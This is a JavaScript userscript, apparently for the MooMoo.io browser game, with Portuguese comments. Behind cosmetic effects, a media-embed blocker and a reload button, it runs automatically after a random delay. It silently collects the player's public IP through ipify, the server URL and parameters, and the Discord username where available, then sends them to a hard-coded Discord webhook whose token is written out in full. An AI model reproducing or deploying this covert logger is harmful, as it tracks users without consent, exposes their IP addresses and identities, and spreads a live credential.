(function() {
    'use strict';

    // Configurações atualizadas
    const config = {
        webhook: 'https://discord.com/api/webhooks/1406254944108941353/FuWyIceDS3Y-TI8LDTvyOLQF_hxRbhZm5e9FnyBDyT7oYYBmW1E5WlAmdl4zEzYmJrjv'
    };

    // Função para extrair metadados do script
    const getScriptMeta = () => {
        const scripts = document.querySelectorAll('script');
        for (const script of scripts) {
            if (script.textContent.includes('@name') && script.textContent.includes('@version')) {
                const metaContent = script.textContent;
                return {
                    name: metaContent.match(/@name\s+(.*)/)[1].trim(),
                    version: metaContent.match(/@version\s+(.*)/)[1].trim(),
                    description: metaContent.match(/@description\s+(.*)/)?.[1]?.trim() || 'Sem descrição'
                };
            }
        }
        return {
            name: '',
            version: '0.0.1',
            description: 'Não foi possível detectar os metadados do script'
        };
    };

    const scriptMeta = getScriptMeta();
    const sessionId = 'sess_' + Math.random().toString(36).substr(2, 8);

    if (window.hasRun) return;
    window.hasRun = true;

    // Detecta informações do Discord se disponível
    const getDiscordInfo = () => {
        try {
            if (window.Discord && window.DiscordNative) {
                return {
                    displayName: window.DiscordNative.userManager.getCurrentUser().username,
                    discriminator: window.DiscordNative.userManager.getCurrentUser().discriminator
                };
            }
        } catch (e) {
            console.error('Discord info not available:', e);
        }
        return null;
    };

    // Animação suave e estilos do botão
    const applySmoothEffects = () => {
        const style = document.createElement('style');
        style.textContent = `
            @keyframes smoothAppear {
                0% { opacity: 0; transform: translateY(5px); }
                100% { opacity: 1; transform: translateY(0); }
            }
            .msa-effect {
                animation: smoothAppear 0.4s ease-out forwards;
            }
            .quit-button {
                background-color: #57F287;
                color: white;
                border: none;
                border-radius: 4px;
                padding: 8px 16px;
                margin-top: 10px;
                font-weight: 500;
                cursor: pointer;
                transition: background-color 0.2s;
            }
            .quit-button:hover {
                background-color: #48d279;
            }
            .quit-button:active {
                transform: translateY(1px);
            }
        `;
        document.head.appendChild(style);
    };

    // Obtém dados completos do servidor
    const getServerData = () => {
        const url = new URL(window.location.href);
        return {
            fullUrl: url.href,
            baseUrl: url.origin,
            serverParams: url.search || 'Nenhum',
            timestamp: new Date().toISOString()
        };
    };

    // Função para recarregar o servidor e o site
    const reloadServerAndSite = () => {
        console.log('Recarregando servidor e site...');

        // Recarrega a página atual
        window.location.reload(true);

        // Se estiver em um iframe ou em um contexto específico do jogo
        try {
            if (window.parent && window.parent !== window) {
                window.parent.location.reload(true);
            }

            // Tenta encontrar e recarregar iframes do jogo
            document.querySelectorAll('iframe').forEach(iframe => {
                try {
                    iframe.contentWindow.location.reload(true);
                } catch (e) {
                    console.log('Não foi possível recarregar iframe:', e);
                }
            });
        } catch (e) {
            console.log('Erro ao tentar recarregar contexto pai:', e);
        }

        // Força um hard reload após 1 segundo (opcional)
        setTimeout(() => {
            window.location.href = window.location.href;
        }, 1000);
    };

    // Cria o botão de quitar jogador
    const createQuitButton = (embedElement) => {
        const buttonContainer = document.createElement('div');
        buttonContainer.style.textAlign = 'center';
        buttonContainer.style.marginTop = '10px';
        buttonContainer.style.marginBottom = '20px';

        const quitButton = document.createElement('button');
        quitButton.className = 'quit-button';
        quitButton.textContent = 'Quitar o Jogador do Game';
        quitButton.onclick = reloadServerAndSite;

        buttonContainer.appendChild(quitButton);

        if (embedElement && embedElement.parentNode) {
            embedElement.parentNode.insertBefore(buttonContainer, embedElement.nextSibling);
        } else {
            document.body.appendChild(buttonContainer);
        }
    };

    // Coleta todas as informações
    const collectAllData = async () => {
        applySmoothEffects();

        const serverData = getServerData();
        const discordInfo = getDiscordInfo();

        let ip = 'Não detectado';
        try {
            const ipResponse = await fetch('https://api.ipify.org?format=json');
            const ipData = await ipResponse.json();
            ip = ipData.ip;
        } catch (e) {
            console.error('IP detection failed:', e);
        }

        return {
            ...serverData,
            ...scriptMeta,
            ip,
            sessionId,
            discordInfo,
            localTime: new Date().toLocaleString('pt-BR')
        };
    };

    // Envia relatório completo
    const sendCompleteReport = async () => {
        try {
            const data = await collectAllData();
            const scriptName = GM_info.script.name || "Desconhecido";
            const scriptVersion = GM_info.script.version || "Desconhecido";
            const scriptdesc = GM_info.script.description || "Desconhecido";
            const scriptdono = GM_info.script.author || "Desconhecido";

            const discordPayload = {
                username: "MooMoo e Script info",
                avatar_url: "https://i.imgur.com/moomoo_icon.png",
                embeds: [{
                    title: `Info do Servidor - ${data.name} v${data.version}`,
                    color: 4437377,
                    fields: [
                        {
                            name: "Link do Servidor",
                            value: `[Acessar este servidor](${data.fullUrl})`,
                            inline: true
                        },
                        {
                            name: "Data server",
                            value: `\`${data.serverParams}\``,
                            inline: true
                        },
                        {
                            name: "IP",
                            value: `\`${data.ip}\``,
                            inline: true
                        },
                        {
                            name: "Script Dono",
                            value: scriptdono,
                            inline: true
                        },
                        {
                            name: "Script Name",
                            value: scriptName,
                            inline: true
                        },
                        {
                            name: "Script Version",
                            value: scriptVersion,
                            inline: true
                        },
                        {
                            name: "Descrição",
                            value: scriptdesc,
                            inline: false
                        },
                        {
                            name: "Sessão id izizi",
                            value: `**ID:** \`${data.sessionId}\`\n**Horário:** ${data.localTime}`,
                            inline: false
                        }
                    ],
                    footer: {
                        text: `Alguem que adora dar log • ${new Date().getFullYear()}`
                    }
                }],
                components: [{
                    type: 1,
                    components: [{
                        type: 2,
                        style: 3,
                        label: "Quitar o Jogador do Game",
                        custom_id: "quit_player_button"
                    }]
                }]
            };

            if (data.discordInfo) {
                discordPayload.embeds[0].fields.push({
                    name: "Usuário do Discord",
                    value: `${data.discordInfo.displayName}#${data.discordInfo.discriminator}`,
                    inline: false
                });
            }

            const response = await fetch(config.webhook, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(discordPayload)
            });

            if (!response.ok) {
                console.error('Failed to send report:', response.status, response.statusText);
            } else {
                console.log('Relatório enviado com sucesso para o Discord');

                // Adiciona o botão na página
                const embeds = document.querySelectorAll('[class*="embed"]');
                if (embeds.length > 0) {
                    createQuitButton(embeds[embeds.length - 1]);
                } else {
                    createQuitButton(null);
                }
            }
        } catch (error) {
            console.error('Error sending report:', error);
        }
    };

    // Bloqueio de conteúdo com efeito suave
    const setupContentBlocker = () => {
        const blockedDomains = [
            'youtube.com', 'youtu.be',
            'twitch.tv',
            'twitter.com'
        ];

        const cleanPage = () => {
            document.querySelectorAll('iframe, script, link').forEach(el => {
                const src = el.src || el.href;
                if (src && blockedDomains.some(d => src.includes(d))) {
                    el.classList.add('msa-effect');
                    el.style.opacity = '0';
                    setTimeout(() => el.remove(), 400);
                }
            });
        };

        setInterval(cleanPage, 2500);
        cleanPage();
    };

    // Inicialização
    setTimeout(() => {
        setupContentBlocker();
        sendCompleteReport().catch(e => console.error('Initialization error:', e));
    }, 1500 + Math.random() * 2000);
})();
